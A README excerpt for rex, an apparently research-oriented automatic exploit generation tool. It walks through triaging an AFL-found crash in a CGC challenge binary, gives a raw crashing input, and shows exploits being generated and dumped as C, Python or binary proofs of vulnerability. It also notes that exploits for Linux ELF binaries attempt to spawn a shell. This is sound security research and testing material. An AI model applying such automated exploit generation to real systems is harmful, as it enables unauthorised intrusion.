### Rex

At the moment rex offers a couple of features, crash triaging, crash exploration, and exploitation for certain kinds of crashes.

In the example below, we take a crashing input for `legit_00003` discovered by AFL. The vulnerability is a simple buffer overflow on the stack, however, before the vulnerable function returns it calls memcpy with a destination parameter which was overwritten during the stack smash.
While rex doesn't know how to exploit an arbitrary memcpy call (yet), it can be told to explore the crash until it finds an exploitation primitive which it knows how to exploit.

Exploit objects can take a crashing input and will attempt to turn it into an exploit which can set every register and leak data from an arbitrary address.

```python
# triage a crash
>>> crash = rex.Crash("./legit_00003", b"\x00\x0b1\xc1\x00\x0c\xeb\xe4\xf1\xf1\x14\r\rM\r\xf3\x1b\r\r\r~\x7f\x1b\xe3\x0c`_222\r\rM\r\xf3\x1b\r\x7f\x002\x7f~\x7f\xe2\xff\x7f\xff\xff\x8b\xc7\xc9\x83\x8b\x0c\xeb\x80\x002\xac\xe2\xff\xff\x00t\x8bt\x8bt_o_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff_k_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff\x00t\x8bt\x8b\xac\xf1\x83\xc2t~c\x00\x00\x00~~\x7f\xe2\xff\xff\x00t\x9e\xac\xe2\xf1\xf2@\x83\xc3t")
>>> crash.crash_types
['write_what_where']
>>> crash.explorable()
True
# explore the crash by setting segfaulting pointers to sane values and re-tracing
>>> crash.explore()
# now we can see that we control instruction pointer
>>> crash.crash_types
'ip_overwrite'
# generate exploits based off of this crash
# it may take several minutes
>>> arsenal = crash.exploit()
# we generated a type 1 POV for every register
>>> len(arsenal.register_setters) # we generate one circumstantial register setter, one shellcode register setter
2
# and one Type 2 which can leak arbitrary memory
>>> len(arsenal.leakers)
1
# exploits are graded based on reliability, and what kind of defenses they can
# bypass, the two best exploits are put into the 'best_type1' and 'best_type2' attributes
>>> arsenal.best_type1.register
'ebp'
# exploits can be dumped in C, Python, or as a compiled POV
>>> arsenal.best_type2.dump_c('legit3_x.c')
>>> arsenal.best_type2.dump_python('legit3_x.py')
>>> arsenal.best_type2.dump_binary('legit3_x.pov')
# also POVs can be tested against a simulation of the CGC architecture
>>> arsenal.best_type1.test_binary()
True
```

Basic support of Linux ELF binaries also exists, exploits generated for ELF binaries will attempt to drop a shell.
